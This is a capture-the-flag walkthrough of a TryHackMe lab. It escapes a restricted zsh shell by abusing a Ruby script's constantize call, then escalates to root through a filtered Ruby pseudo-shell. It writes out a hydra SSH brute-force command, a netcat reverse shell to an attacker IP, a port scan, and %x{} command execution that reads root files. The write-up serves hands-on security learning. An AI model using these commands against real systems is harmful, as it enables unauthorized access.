**Using simple recon/enumeration and SSH bruteforcing using** 
``hydra -l <user> -P /path/to/wordlist/ ssh://IP_ADDRESS -t 6``
**I got ssh access.**
[[Credential testing (brute force tools)]]

```
red-stone-one-carat% whoami;hostname;id;ip a
zsh: command not found: whoami
zsh: command not found: hostname
zsh: command not found: id
zsh: command not found: ip
red-stone-one-carat% /bin/bash
zsh: /bin/bash: restricted
```

**Hmm… Looks like we're in a restricted zsh shell!**

running ``which $SHELL`` tells us that  our `SHELL` variable is `/bin/rzsh`, which is a restricted zsh shell. Most GNU coreutils arent working

**Armed with above information, we can use `echo *` and `echo .*` to list files:**

```
red-stone-one-carat% echo * 
bin user.txt
```

**The `bin/test.rb` looks interesting. Let's execute that:**

```
red-stone-one-carat% test.rb
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

- If the number of arguments are equal to 3:
    - **Set the `test.rb` script to find a declared constant with the name specified in the string**
- If no argument is given, print the source code of `test.rb`

the `constantize` prevents "any" ruby code from being executed, it allows unintended classes to be initiate.

**Now, to abuse that, we can use class `Kernel`, class method `exec()`, and argument `<command>`:**

**If we can execute any OS command from `test.rb`, why not just use that ruby script?**

```
red-stone-one-carat% test.rb Kernel 'system' "/bin/ls -lah"
total 72K
drwxr-xr-x 4 noraj   noraj   4.0K Jan 12 03:28 .
drwxr-xr-x 4 root    root    4.0K May 17  2021 ..
drwxr-xr-x 2 root    root    4.0K May 17  2021 bin
drwx------ 2 noraj   noraj   4.0K Jan 12 03:28 .cache
-rw-r--r-- 1 vagrant vagrant   36 May 17  2021 .hint.txt
-rw-r--r-- 1 vagrant vagrant   37 May 17  2021 user.txt
-rw-rw-r-- 1 noraj   noraj    42K Jan 12 03:28 .zcompdump.red-stone-one-carat.1398
-rw-r--r-- 1 vagrant vagrant   20 May 17  2021 .zshrc
```

it works

on your machine, start a listener
check [[Reverse Shells]]
```
nc -lnvp 443
```

start a reverse shell 
```
red-stone-one-carat% test.rb Kernel 'system' "/bin/nc.traditional 10.9.0.253 443 -e /bin/zsh"
```

```
nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.47.251] 52508
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
whoami;hostname;id
noraj
red-stone-one-carat
uid=1001(noraj) gid=1001(noraj) groups=1001(noraj)
```

here we use [[Fix Empty or Broken PATH in a Shell]] to be able to use those commands 
However, the shell is still very restricted. 

```
cat user.txt
zsh: permission denied: cat
```

instead use:

```
echo $(<user.txt)
THM{Redacted}
```

**In the `.hint.txt` file, it said:**

> Maybe take a look at local services.

**Since the target machine has `nc`, we can leverage that to scan all ports:**

```
nc -zvnw 1 127.0.0.1 1-65535
(UNKNOWN) [127.0.0.1] 31547 (?) open
(UNKNOWN) [127.0.0.1] 22 (ssh) open
```

```
nc 127.0.0.1 31547
$ 
```

yesss, finally a shell thats NOT compeletely unstable and non-rendering!

```
$ echo hello?
undefined method `hello?' for main:Object
```

Hmm… Looks like we're inside a ruby pseudo shell.


---

# Ruby pseudo shell

**We can try to read file:**

```
$ File.read('/etc/passwd') 
Forbidden character
```

mmm… Our input is getting filtered?

**According to this [StackOverflow](https://stackoverflow.com/questions/2232/how-to-call-shell-commands-from-ruby) post, we can execute command via**

- Built-in syntax, `%x( cmd )`
    
    Following the `x` character is a delimiter, which can be any character. If the delimiter is one of the characters `(`, `[`, `{`, or `<`, the literal consists of the characters up to the matching closing delimiter, taking account of nested delimiter pairs. For all other delimiters, the literal comprises the characters up to the next occurrence of the delimiter character. String interpolation `#{ ... }` is allowed.
    
    Returns the result (i.e. standard output) of the shell command, just like the backticks.
    
    Docs: [https://docs.ruby-lang.org/en/master/syntax/literals_rdoc.html#label-Percent+Strings](https://docs.ruby-lang.org/en/master/syntax/literals_rdoc.html#label-Percent+Strings)
    
   ```
    value = %x( echo 'hi' )
    value = %x[ #{cmd} ]
    ```

trying this method, 

```
$ %x{id}
uid=0(root) gid=0(root) groups=0(root)
```

```
$ %x{ls -lah /root}
total 32K
drwx------  4 root    root    4.0K May 17  2021 .
drwxr-xr-x 23 root    root    4.0K May 17  2021 ..
-rw-r--r--  1 root    root    3.1K May 12  2021 .bashrc
drwx------  2 root    root    4.0K May 12  2021 .cache
drwx------  3 root    root    4.0K May 12  2021 .gnupg
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rw-r--r--  1 vagrant vagrant   37 May 17  2021 root.txt
-rwxr-xr--  1 vagrant vagrant  612 May 17  2021 server.rb
```

```
$ %x{cat /root/root.txt}   
Forbidden character
$ %x{cat /root/*}
THM{redacted}
```
   